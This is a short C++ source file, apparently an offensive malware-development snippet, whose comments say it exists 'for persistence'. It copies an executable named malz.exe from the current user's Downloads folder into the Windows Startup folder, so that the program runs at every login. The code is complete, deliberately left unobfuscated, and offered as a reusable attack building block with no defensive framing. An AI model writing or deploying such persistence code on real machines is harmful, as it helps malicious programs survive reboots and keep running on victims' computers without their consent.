// Just copies the binary to the Startup directory for persistence purposes.
// Raw code, no encoding or encryption

#include <iostream>
#include <windows.h>
#include <filesystem>
#include <string.h>
#include <cstdlib>

using namespace std;
namespace fs = std::filesystem;

string username = getenv("USERNAME");

int main() {
    cout << "Pls no copy pasterino!\n";

    string targetFile = "C:\\Users\\" + username + "\\Downloads\\malz.exe";
    string targetDIR = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\malz.exe";

    fs::copy(targetFile, targetDIR); //copy malz.exe to Startup directory for persistence

    return 0;
}
